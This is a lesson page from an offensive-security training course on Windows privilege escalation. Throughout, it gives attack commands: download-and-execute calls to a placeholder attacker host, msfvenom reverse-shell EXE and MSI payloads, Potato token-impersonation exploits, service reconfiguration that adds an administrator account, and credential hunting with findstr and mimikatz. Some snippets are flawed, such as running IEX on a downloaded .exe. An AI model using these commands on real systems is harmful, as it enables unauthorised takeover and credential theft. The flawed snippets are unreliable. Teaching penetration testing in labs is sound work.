---
title: "Windows Privilege Escalation — Enumeration"
tags: [windows, privilege-escalation, enumeration, WinPEAS, PowerShell,
       token-impersonation, unquoted-service-path, AlwaysInstallElevated,
       T1548, T1134, ATT&CK]
module: 04-BroadSurface-04
day: 238
related_topics:
  - Linux PrivEsc Enumeration (Day 234)
  - Windows PrivEsc Lab (Day 239)
  - Post-Exploitation Basics (Day 241)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 238 — Windows Privilege Escalation: Enumeration

> "Windows is a different beast. It looks like a GUI, but underneath it is
> tokens, ACLs, registry keys, and service configurations — layers of
> complexity built over thirty years. Every one of those layers has a
> misconfiguration vector. The attacker who knows where to look in the
> registry, which token privileges to abuse, and which service paths are
> unquoted will find a path in almost every corporate Windows environment
> they enter."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Run WinPEAS and interpret its output to identify PrivEsc paths.
2. Enumerate token privileges and identify which ones are exploitable.
3. Find unquoted service paths manually and with automated tools.
4. Identify weak service and registry permissions.
5. Check for AlwaysInstallElevated and other common misconfiguration classes.

**Time budget:** 4–5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Windows architecture and user model | Day 9 (Linux analogy), self-study |
| PowerShell basics | Self-study or Day 16 equivalent |
| Service and registry concepts | Conceptual coverage here |

---

## Part 1 — Windows PrivEsc Categories

Windows privilege escalation falls into these categories (in rough priority order):

| Category | Vector | Typical Frequency |
|---|---|---|
| Token privileges | SeImpersonatePrivilege, SeAssignPrimaryToken | Very common on service accounts |
| Unquoted service paths | Services with spaces in path, no quotes | Common in legacy installations |
| Weak service permissions | Service binary writable, or service DACL modifiable | Moderate |
| Weak registry permissions | AutoRun, service image path in writable registry key | Moderate |
| AlwaysInstallElevated | MSI installs as SYSTEM when this policy is set | Occasionally found |
| DLL hijacking | Missing DLL loaded from user-writable path | Application-specific |
| Stored credentials | PowerShell history, DPAPI, SAM/NTDS | Very common in mature engagements |
| Kernel exploits | Unpatched CVEs on old OS versions | Last resort |

---

## Part 2 — Automated Enumeration: WinPEAS

```powershell
# Download and run WinPEAS (x64 binary)
# From attacker (Python HTTP server):
# python3 -m http.server 8000

# On target (PowerShell):
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:8000/winPEASx64.exe')
# Or download first:
Invoke-WebRequest -Uri http://<attacker-ip>:8000/winPEASx64.exe -OutFile C:\Temp\wp.exe
C:\Temp\wp.exe > C:\Temp\winpeas-output.txt

# Run the PowerShell version (less likely to trigger AV):
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:8000/winPEAS.ps1')
```

### Key WinPEAS Sections to Review

```
[+] Current User — who are you, what groups, what token privileges?
[+] Interesting Privileges — SeImpersonate, SeAssignPrimaryToken, SeTakeOwnership?
[+] Unquoted service paths — paths with spaces, no quotes
[+] Modifiable services — services whose binary or config you can change
[+] AlwaysInstallElevated — both HKCU and HKLM must be set
[+] Stored credentials — cmdkey, PowerShell history, GPP passwords
[+] AutoRuns — anything running from a writable path on startup
[+] DLL hijacking — processes loading DLLs from user-writable locations
```

---

## Part 3 — Token Privileges

Windows processes have a security token that carries: user SID, group SIDs,
and privileges. Privileges determine what system-level operations the process
can perform. If you land on a service account with certain privileges, root
(SYSTEM) is often one step away.

### Check Current Privileges

```powershell
# List all privileges (powershell)
whoami /priv

# Key privileges for escalation:
# SeImpersonatePrivilege    → most common on IIS/SQL service accounts
# SeAssignPrimaryTokenPrivilege → similar to SeImpersonate
# SeTakeOwnershipPrivilege  → can take ownership of any object (file, registry)
# SeBackupPrivilege         → can read any file (SAM, SYSTEM hive)
# SeRestorePrivilege        → can write to any file → overwrite system files
# SeDebugPrivilege          → can attach to and inject into any process
# SeLoadDriverPrivilege     → can load a signed/unsigned kernel driver
```

### Exploiting SeImpersonatePrivilege (Potato Attacks)

`SeImpersonatePrivilege` lets a service account impersonate authenticated users.
Potato attacks abuse COM/DCOM or NTLM to coerce SYSTEM-level authentication
and impersonate it.

```powershell
# Check if SeImpersonate is enabled:
whoami /priv | findstr Impersonate

# Download the appropriate potato:
# GodPotato — works on Windows Server 2012 → 2022
# PrintSpoofer — requires a print spooler service
# SweetPotato — combines multiple potato techniques

# GodPotato (most universal):
Invoke-WebRequest -Uri http://<attacker-ip>:8000/GodPotato-NET4.exe -OutFile C:\Temp\gp.exe
C:\Temp\gp.exe -cmd "cmd /c whoami"
# Expected: NT AUTHORITY\SYSTEM

# Execute a reverse shell as SYSTEM:
C:\Temp\gp.exe -cmd "cmd /c C:\Temp\shell.exe"

# PrintSpoofer (if print spooler is running):
.\PrintSpoofer64.exe -c "cmd.exe" -i
```

---

## Part 4 — Unquoted Service Paths

Windows service paths that contain spaces must be quoted. If they are not,
Windows tries multiple interpretations — and if any intermediate path exists
and is writable, a binary placed there runs as SYSTEM.

### How It Works

```
Service image path: C:\Program Files\My App\service.exe

Windows tries in order:
  1. C:\Program.exe           ← if this file exists, it runs as SYSTEM
  2. C:\Program Files\My.exe  ← if this exists, it runs as SYSTEM
  3. C:\Program Files\My App\service.exe  ← the real binary
```

### Finding Unquoted Service Paths

```powershell
# Method 1: WMI query
Get-WmiObject Win32_Service | Where-Object {
  $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select-Object Name, PathName, StartMode, State

# Method 2: sc.exe (CMD)
sc qc ServiceName

# Method 3: PowerShell with more detail
Get-WmiObject Win32_Service | Where-Object {
  $_.StartMode -ne 'Disabled' -and
  $_.PathName -notmatch '^"' -and
  $_.PathName -match ' '
} | ForEach-Object {
  $path = $_.PathName
  $name = $_.Name
  # Check if any intermediate path is writable
  $parts = $path -split ' '
  for ($i = 1; $i -lt $parts.Count; $i++) {
    $testPath = ($parts[0..$i] -join ' ').TrimEnd('.exe')
    $dir = Split-Path $testPath -Parent 2>$null
    if ($dir -and (Test-Path $dir)) {
      $acl = Get-Acl $dir 2>$null
      $writable = $acl.Access | Where-Object {
        $_.IdentityReference -match "Everyone|BUILTIN\\Users|$env:USERNAME" -and
        $_.FileSystemRights -match "Write|FullControl"
      }
      if ($writable) {
        Write-Host "[VULNERABLE] Service: $name`nPath: $path`nWritable: $dir"
      }
    }
  }
}
```

### Exploitation

```bash
# If "C:\Program Files\My App\" is writable:
# Create a malicious "My.exe" in "C:\Program Files\"
# When the service starts, Windows runs your binary as SYSTEM

# Generate a shell binary:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 \
  -f exe -o My.exe

# Copy to the writable intermediate path:
copy My.exe "C:\Program Files\My.exe"

# Restart the service (or wait for system restart):
sc stop "VulnerableService"
sc start "VulnerableService"
# Or: Restart-Computer (last resort)
```

---

## Part 5 — Weak Service Permissions

Even if the path is fully quoted, the service DACL itself may allow you to
modify the service configuration — changing the binary it points to.

```powershell
# Check service permissions using Accesschk (Sysinternals)
Invoke-WebRequest -Uri http://<attacker-ip>:8000/accesschk64.exe -OutFile C:\Temp\ac.exe
C:\Temp\accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
C:\Temp\accesschk64.exe -uwcqv "%username%" * /accepteula

# Look for: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS, GENERIC_WRITE

# If you can change the binary path:
sc config VulnerableService binpath= "cmd /c net user ghost Password123! /add"
sc start VulnerableService

# Then add to administrators:
sc config VulnerableService binpath= "cmd /c net localgroup administrators ghost /add"
sc start VulnerableService
```

### Weak Binary Permissions

```powershell
# If you cannot change the service config but can write to the binary path:
# Find the binary:
sc qc VulnerableService | findstr BINARY

# Check permissions on the binary itself:
C:\Temp\accesschk64.exe -quvw "C:\Program Files\VulnerableSvc\service.exe"
# Look for: FILE_ALL_ACCESS, FILE_WRITE_DATA

# If writable: replace with your payload
copy C:\Temp\shell.exe "C:\Program Files\VulnerableSvc\service.exe"
sc restart VulnerableService
```

---

## Part 6 — AlwaysInstallElevated

When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1,
Windows Installer (msiexec) runs `.msi` packages with SYSTEM privileges — any
.msi can be created and run by any user to get SYSTEM.

```powershell
# Check both registry keys:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1 for the vulnerability to exist

# Generate a malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 \
  -f msi -o malicious.msi

# Copy to target and run:
msiexec /quiet /qn /i C:\Temp\malicious.msi
# Shell arrives as NT AUTHORITY\SYSTEM
```

---

## Part 7 — Stored Credentials

```powershell
# Windows Credential Manager (cmdkey)
cmdkey /list
# If entries exist, try runas with saved credentials:
runas /savecred /user:DOMAIN\Administrator cmd.exe

# PowerShell command history
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Search for passwords in common config locations
findstr /si "password" C:\Users\*\*.txt C:\Users\*\*.xml C:\Users\*\*.config
findstr /si "password" C:\Windows\*.txt C:\Windows\*.xml
findstr /si "password" C:\inetpub\*.config

# GPP passwords in SYSVOL (domain environments)
findstr /s /i "cpassword" \\<domain>\SYSVOL\*.xml

# DPAPI — decryptable master keys in:
# C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
# C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
# Decrypt with: mimikatz dpapi::cred /in:<file> /unprotect
```

---

## Key Takeaways

1. **SeImpersonatePrivilege is your most common Windows path.** IIS application
   pools, SQL Server service accounts, and many other services run with this
   privilege. If you land in a web shell context on Windows, check this first.
2. **Unquoted service paths are widespread in legacy environments.** Commercial
   software installed in Program Files without proper quotation is a decades-old
   problem that persists in enterprise environments.
3. **WinPEAS covers 80% of the search — manual verification covers the rest.**
   False positives exist. For each WinPEAS finding, verify the actual permissions
   yourself before attempting exploitation.
4. **PowerShell history is underrated.** Administrators frequently type
   credentials in PowerShell — connect to databases, authenticate to APIs,
   set up services — and that history persists in plaintext. Check it before
   spending time on complex exploits.
5. **Windows event logs are comprehensive.** Service configuration changes
   (Event 7040), privilege use (Event 4673), and new process creation (Event
   4688) all create logs. Speed and cleanup matter.

---

## Exercises

1. Set up a Windows VM (or use a HackTheBox Windows machine) and run WinPEAS
   against it. Document every yellow/red finding. For each one, research the
   exploitation steps manually (without looking up a WinPEAS guide).

2. Research the four main "Potato" attack variants (Hot Potato, Juicy Potato,
   Rotten Potato, Sweet Potato). What changed between each generation? What
   Windows update / configuration broke the previous version? What does
   GodPotato do differently that makes it work on current Windows versions?

3. Write a PowerShell script that enumerates all services with unquoted paths
   and checks whether any intermediate path is writable by the current user.
   Output should be a prioritised list of exploitable services.

4. Research: what is PrintNightmare (CVE-2021-1675 / CVE-2021-34527)? Is it
   a privilege escalation or a remote code execution? What conditions are
   required? Is it relevant to environments without a print spooler?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q238.1, Q238.2 …).
> Follow-up questions use hierarchical numbering (Q238.1.1, Q238.1.2 …).

---

## Navigation

← Previous: [Day 237 — Kernel Exploits: Linux](DAY-0237-Kernel-Exploits-Linux.md)
→ Next: [Day 239 — Windows PrivEsc Lab](DAY-0239-Windows-PrivEsc-Lab.md)
